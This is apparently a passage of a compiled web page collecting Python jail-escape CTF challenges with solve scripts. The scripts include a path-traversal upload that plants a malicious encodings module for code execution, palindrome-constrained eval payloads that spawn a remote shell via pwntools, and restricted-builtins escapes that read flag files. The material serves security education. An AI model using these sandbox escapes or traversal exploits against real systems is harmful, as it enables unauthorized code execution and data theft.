    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

payload <span class="token operator">=</span> <span class="token string">'f"&#123;(f:=(t:=(g:=+(()==()))+g)*t*t*t*t+g+g)+t*t*(t+g):c&#125;&#123;(c:=(f*t+t*t*t*t+t*t*t+t+g)):c&#125;&#123;c:c&#125;&#123;c+t+t:c&#125;'</span>
payload <span class="token operator">=</span> <span class="token string">'f"&#123;(c:=(f:=(t:=(g:=+(()==()))+g)*t*t*t*t)*t+t*t*t*t+t*t*t+t+g):c&#125;&#123;c+t+t+t:c&#125;&#123;f:c&#125;'</span>

whitelist <span class="token operator">=</span> <span class="token triple-quoted-string string">"""gctf&#123;"*+*(=>:/)*+*"&#125;"""</span>
<span class="token comment"># generate payload</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> m<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">in</span> whitelist<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#123;"</span> <span class="token keyword">or</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> mapping<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> <span class="token string">"&#123;c:c&#125;"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> <span class="token string">"&#123;%s:c&#125;"</span> <span class="token operator">%</span> mapping<span class="token punctuation">[</span>c<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token string">'"'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># verify payload is the same</span></code>`,Wp,En,ia,sc,Vp,hn,Va,Ga,ac,Gp,xn,nr=`<code class="language-py"><span class="token keyword">import</span> sys
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This is a safe calculator"</span><span class="token punctuation">)</span>
inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Formula: "</span><span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

blacklist <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."</span>
<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> inp <span class="token keyword">for</span> x <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nice try"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

fns <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">"setattr"</span><span class="token punctuation">:</span> <span class="token builtin">setattr</span><span class="token punctuation">,</span> <span class="token string">"__import__"</span><span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">,</span> <span class="token string">"chr"</span><span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> fns<span class="token punctuation">,</span> fns<span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,$p,An,$a,Xa,tc,Xp,Cn,sr='<code class="language-py"><span class="token comment"># TBA</span></code>',Kp,Ln,ka,pc,Zp,Tn,Ka,Za,oc,Jp,Fn,ar=`<code class="language-py"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> send_from_directory
<span class="token keyword">import</span> dis
<span class="token keyword">import</span> io
<span class="token keyword">import</span> contextlib
<span class="token keyword">import</span> os
<span class="token keyword">import</span> datetime
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/report/&lt;path:filename>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">serve_reports</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'./reports/'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">del</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span>
    res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>
    <span class="token keyword">return</span> res

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">disassemble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    report_name <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename
    source <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'./reports/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/report/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span>
    report <span class="token operator">=</span> io<span class="token punctuation">.</span>StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> contextlib<span class="token punctuation">.</span>redirect_stdout<span class="token punctuation">(</span>report<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Report for'</span><span class="token punctuation">,</span> report_name<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Report date:'</span><span class="token punctuation">,</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            code <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token string">'&lt;string>'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span>
            dis<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
        <span class="token keyword">except</span> SyntaxError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Source code:'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./reports/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        width <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> report<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> report<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            line <span class="token operator">=</span> line<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>width<span class="token punctuation">)</span> <span class="token keyword">if</span> line <span class="token operator">!=</span> <span class="token string">'-'</span> <span class="token keyword">else</span> <span class="token string">'-'</span> <span class="token operator">*</span> width
            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'# '</span> <span class="token operator">+</span> line <span class="token operator">+</span> <span class="token string">' #&#92;n'</span><span class="token punctuation">)</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>source<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/report/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span></code>`,Qp,Hn,Ja,Qa,ec,no,Rn,tr=`<code class="language-py"><span class="token comment"># @null</span>
<span class="token keyword">import</span> requests
<span class="token comment"># target = 'http://localhost:1337/'</span>
target <span class="token operator">=</span> <span class="token string">'http://io.ept.gg:42256/'</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">b'''import os
os.system('cp /flag*.txt /app/reports/flag.txt')'''</span>

<span class="token comment"># Upload payload to /usr/local/lib/python3.12/encodings/fefe.py</span>
files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'source'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'../../usr/local/lib/python3.12/encodings/fefe.py'</span><span class="token punctuation">,</span> payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token comment"># When running or compiling python files that use the fefe encoding will now trigger our payload</span>
files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'source'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'fefe.py'</span><span class="token punctuation">,</span> <span class="token string">b'# encoding: fefe'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment"># trigger payload</span>
<span class="token comment"># Read flag</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/report/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code>`,so,Dn,ra,cc,ao,In,nt,st,lc,to,Pn,pr=`<code class="language-py"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#</span>
    x <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"palindrome? "</span><span class="token punctuation">)</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token string">"#"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> x<span class="token punctuation">,</span> <span class="token string">"comments are bad"</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ascii only kthx"</span><span class="token comment">#</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> x <span class="token operator">==</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"not a palindrome"</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token string">"palindromes can't be more than 35 characters long, this is a well known fact."</span><span class="token comment">#</span>
    <span class="token comment">#assert sum(x.encode()) % 256 == 69, "not nice!"#</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment">#)x(lave</span>
<span class="token comment">#"!ecin ton" ,96 == 652 % ))(edocne.x(mus tressa</span>
<span class="token comment">#".tcaf nwonk llew a si siht ,gnol sretcarahc 53 naht erom eb t'nac semordnilap" ,63 &lt; )x(nel tressa</span>
<span class="token comment">#"emordnilap a ton" ,]1-::[x == x tressa</span>
<span class="token comment">#"xhtk ylno iicsa" ,)x ni i rof 821 &lt; )i(dro(lla tressa</span>
<span class="token comment">#"dab era stnemmoc" ,x ni ton "#" tressa</span>
<span class="token comment">#)" ?emordnilap"(tupni = x</span>
<span class="token comment">#:eurT elihw</span></code>`,po,On,at,tt,uc,oo,Un,or=`<code class="language-py"><span class="token comment"># setting up template for generating palindromes</span>
alph <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstvwyzABCDEFGHIJKLMNOPQRSTVWYZ1234567890!\\"</span><span class="token comment">#\xA4%&amp;/()=?@$\u20AC&#123;[]&#125;"</span>
dd <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',)"CHAR"=:VAR1(,',(VAR1:="CHAR"),'\\START'"""</span>
ff <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',)"CHAR"+VAR2=:VAR1(,',(VAR1:=VAR2+"CHAR"),'\\START'"""</span>
gg <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',))VAR1(lave(,',(eval(VAR1)),'\\START'"""</span>
ch <span class="token operator">=</span> <span class="token punctuation">[</span>dd<span class="token punctuation">,</span>ff<span class="token punctuation">,</span>gg<span class="token punctuation">]</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""eval(input());"""</span>
out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

var <span class="token operator">=</span> var2 <span class="token operator">=</span> <span class="token string">"C"</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span>char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    found <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token comment"># some dumb manual fixes</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"a"</span>
        var2 <span class="token operator">=</span> <span class="token string">"C"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"C"</span>
        var2 <span class="token operator">=</span> <span class="token string">"a"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"b"</span>
        var2 <span class="token operator">=</span> <span class="token string">"C"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"b"</span>
        var2 <span class="token operator">=</span> <span class="token string">"b"</span>
    <span class="token comment"># brute char</span>
    <span class="token keyword">for</span> brute <span class="token keyword">in</span> alph<span class="token punctuation">:</span>
        n <span class="token operator">=</span> ch<span class="token punctuation">[</span><span class="token number">1</span> <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span> <span class="token keyword">and</span> i<span class="token operator">!=</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span> <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"START"</span><span class="token punctuation">,</span>brute<span class="token punctuation">)</span>
        <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token string">"\\"</span>"<span class="token punctuation">:</span>
            char <span class="token operator">=</span> <span class="token string">"\\\\"</span><span class="token operator">+</span>char
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"CHAR"</span><span class="token punctuation">,</span>char<span class="token punctuation">)</span>
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"VAR1"</span><span class="token punctuation">,</span> var<span class="token punctuation">)</span>
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"VAR2"</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span>
        check <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token number">69</span> <span class="token keyword">and</span> n <span class="token operator">==</span> n<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span>
            found <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"COULDNT FIND VALID CHAR"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>

<span class="token comment"># verify payload works</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> p <span class="token keyword">in</span> out<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
'Y\\',)"e"=:C(,',(C:="e"),'\\Y'
'Z\\',)"v"+C=:C(,',(C:=C+"v"),'\\Z'
'o\\',)"a"+C=:C(,',(C:=C+"a"),'\\o'
'd\\',)"l"+C=:C(,',(C:=C+"l"),'\\d'
'(\\',)"("+C=:C(,',(C:=C+"("),'\\('
'g\\',)"i"+C=:C(,',(C:=C+"i"),'\\g'
'b\\',)"n"+C=:C(,',(C:=C+"n"),'\\b'
'B\\',)"p"+C=:a(,',(a:=C+"p"),'\\B'
'=\\',)"u"+a=:C(,',(C:=a+"u"),'\\='
'=\\',)"t"+C=:b(,',(b:=C+"t"),'\\='
'j\\',)"("+b=:b(,',(b:=b+"("),'\\j'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'a\\',))b(lave(,',(eval(b)),'\\a'
"""</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge28.play.potluckctf.com'</span><span class="token punctuation">,</span><span class="token number">31337</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> p <span class="token keyword">in</span> out<span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'palindrome?'</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"__import__('os').system('sh')"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,eo,Bn,_a,ic,co,Mn,pt,ot,kc,lo,qn,er=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">locals</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'__build_class__'</span><span class="token punctuation">:</span> __build_class__<span class="token punctuation">,</span> <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>
                <span class="token string">'''</span><span class="token punctuation">,</span> <span class="token string">'""'</span><span class="token punctuation">,</span> <span class="token string">'(('</span><span class="token punctuation">,</span> <span class="token string">'[['</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'=='</span><span class="token punctuation">,</span>
                <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'11'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span>
                <span class="token string">'True'</span><span class="token punctuation">,</span> <span class="token string">'False'</span><span class="token punctuation">,</span> <span class="token string">'None'</span><span class="token punctuation">,</span> <span class="token string">'...'</span><span class="token punctuation">,</span>
                <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'**'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>

        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> code<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">any</span><span class="token punctuation">(</span>word <span class="token keyword">in</span> code <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Blacklisted word detected, exiting ..."</span><span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token builtin">locals</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,uo,Nn,et,ct,rc,io,jn,cr=`<code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"challs.ifctf.fibonhack.it"</span><span class="token punctuation">,</span> <span class="token number">10010</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
for __name__ in __build_class__.__class__.__dir__.__qualname__:
    @__build_class__.__self__.exec
    @__build_class__.__self__.input
    class x:pass
"""</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#92;n"</span><span class="token punctuation">,</span><span class="token string">"&#92;r"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"__build_class__.__self__.print(__build_class__.__self__.open('./flag.txt').read())"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,ko,Sn,fa,_c,ro,zn,lt,ut,fc,_o,Yn,lr=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> secret
<span class="token keyword">import</span> pyseccomp
<span class="token keyword">import</span> sys

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Find the treasure!"</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

